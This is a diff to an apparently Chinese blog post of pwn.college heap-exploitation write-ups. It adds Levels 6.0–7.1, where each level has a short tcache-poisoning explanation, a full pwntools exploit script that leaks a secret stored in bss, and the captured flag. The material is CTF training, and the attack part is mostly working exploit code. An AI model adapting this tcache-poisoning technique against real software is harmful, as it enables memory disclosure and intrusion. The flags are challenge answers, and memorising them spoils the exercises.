@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-09-08
+updated: 2025-09-11
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -205,16 +205,7 @@ if __name__ == "__main__":
 
 与 [Level 1](#level-10) 区别不大。但是在 malloc 存放 flag 的空间时使用的是 `rand() % 872 + 128`，这会生成 $[ 0+128,872+128)$ 范围内的随机数。所以我们要么预测它生成什么随机数，要么爆破它落在哪个 bin 中。
 
-[rand](https://en.cppreference.com/w/c/numeric/random/rand) 生成的是伪随机数，可以预测。本来想直接预测 RNG 的：
-
-```python
-import ctypes
-
-libc = ctypes.CDLL("./libc.so.6")
-
-libc.srand(1)
-predicted_size = (libc.rand() & 0x7FFFFFFF) % 872 + 128
-```
+[rand](https://en.cppreference.com/w/c/numeric/random/rand) 生成的是伪随机数，可以预测。本来想直接 break PRNG 的：[上帝掷骰子？不，其实是线性同余](/posts/pwn-notes/pwn-trick-notes/#上帝掷骰子不其实是线性同余)。
 
 但是后来发现程序在 `__libc_csu_init` 中调用了 `flag_seed`，而这个函数内部又调用了 `srand(seed)`，它的 seed 是循环异或栈上的数据得来的。虽然在每台机器上运行都会有特定的栈上的数据，但是并不是一个普适的方法，尽管我可以 debug 得到 seed，但是远程就打不通了。所以我们还是用爆破 bins 的方法好了。tcache bins 有限，这个 rand 生成的范围也不是很大，所以还是很容易爆破的。
 
@@ -1003,3 +994,510 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{YWZIg8kQV_nzpSzsFagMNO6O6Qn.0FM4MDL5cTNxgzW}`]
+
+# Level 6.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Corrupt the TCACHE entry_struct to read unintended memory.
+
+## Write-up
+
+ptr 数组管理多个分配，`scanf` 向指定 chunk 写入 data，`send_flag` 验证输入的 secret 与随机生成的存放在 bss 中的 secret 是否相同，相同则输出 flag 。
+
+这是生成随机 8 字节 secret 的部分：
+
+```c
+  for ( i = 0; i <= 7; ++i )
+    byte_428849[i] = rand() % 26 + 97;
+```
+
+由于没开 PIE，而生成的 secret 又是保存在 bss 段，所以我们可以精准定位 secret 的地址。
+
+`puts` 将 `ptr[idx]` 视为字符串指针，输出其保存的内容。所以我们只要想办法令 malloc 返回给 ptr[idx] 的地址为 bss 上存放 secret 的地址就可以输出 secret 了。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/babyheap_level6.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret = elf.bss() + 0x18849
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret = target.recvline().strip().decode("ascii")
+    send_flag(secret)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{wLCxyleFYPCBwUq2LzFkqEM8qzv.0VM4MDL5cTNxgzW}`]
+
+# Level 6.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Corrupt the TCACHE entry_struct to read unintended memory.
+
+## Write-up
+
+参见 [Level 6.0](#level-60)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/babyheap_level6.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret = elf.bss() + 0x1B553
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret = target.recvline().strip().decode("ascii")
+    send_flag(secret)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{oc9V7EmGNRr7415ZlPgXYL-qDjV.0lM4MDL5cTNxgzW}`]
+
+# Level 7.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Corrupt the TCACHE entry_struct to read unintended memory.
+
+## Write-up
+
+和上题一样，但是这次变成了 16 字节随机值：
+
+```c
+  for ( i = 0; i <= 15; ++i )
+    byte_429532[i] = rand() % 26 + 97;
+```
+
+问题就在于，按照上个方法我们令 malloc 拿到 secret 的地址后，它会将 `e->key = NULL`，导致后 8 字节被清空。
+
+但是也很好解决。既然我们可以泄漏出前 8 字节，那我们将偏移加 8 再来一次不就泄漏出后 8 字节了吗？
+
+分析下面设置 seed 的流程我们知道，seed 每次运行程序都是一样的，由于上面生成随机 secret 的部分用的是伪随机数发生器，所以每次运行结果也是不变的，那就没啥好担心的了。
+
+```c
+unsigned __int64 flag_seed()
+{
+  unsigned int seed; // [rsp+4h] [rbp-9Ch]
+  unsigned int i; // [rsp+8h] [rbp-98h]
+  int fd; // [rsp+Ch] [rbp-94h]
+  _QWORD buf[17]; // [rsp+10h] [rbp-90h] BYREF
+  unsigned __int64 v5; // [rsp+98h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  memset(buf, 0, 128);
+  fd = open("/flag", 0);
+  if ( fd < 0 )
+    __assert_fail("fd >= 0", "<stdin>", 0x20u, "flag_seed");
+  if ( read(fd, buf, 0x80uLL) <= 0 )
+    __assert_fail("read(fd, flag, 128) > 0", "<stdin>", 0x21u, "flag_seed");
+  seed = 0;
+  for ( i = 0; i <= 31; ++i )
+    seed ^= *((_DWORD *)buf + (int)i);
+  srand(seed);
+  memset(buf, 0, 128uLL);
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+反正我用的方法比较简单粗暴，不过我也想过一次性泄漏完整的 secret，那就需要伪造 chunk size，提前做点布局……实际操作起来还挺麻烦的，也就没继续深入……
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/babyheap_level7.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret_p1 = elf.bss() + 0x19532
+    secret_p2 = secret_p1 + 0x8
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p1))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_p1 = target.recvline().strip().decode("ascii")
+    target.success(f"Part 1: {secret_p1}")
+    target.close()
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p2))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_p2 = target.recvline().strip().decode("ascii")
+    target.success(f"Part 2: {secret_p2}")
+
+    secret = secret_p1 + secret_p2
+    send_flag(secret)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{QXpTguKBiT4StYFr24ZsUSfm3-8.01M4MDL5cTNxgzW}`]
+
+# Level 7.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Corrupt the TCACHE entry_struct to read unintended memory.
+
+## Write-up
+
+参见 [Level 7.0](#level-70)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/babyheap_level7.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret_p1 = elf.bss() + 0x17051
+    secret_p2 = secret_p1 + 0x8
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p1))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_p1 = target.recvline().strip().decode("ascii")
+    target.success(f"Part 1: {secret_p1}")
+    target.close()
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p2))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_p2 = target.recvline().strip().decode("ascii")
+    target.success(f"Part 2: {secret_p2}")
+
+    secret = secret_p1 + secret_p2
+    send_flag(secret)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{cy0iZfUAyZ9bbo5DL_cS-9sxRN6.0FN4MDL5cTNxgzW}`]
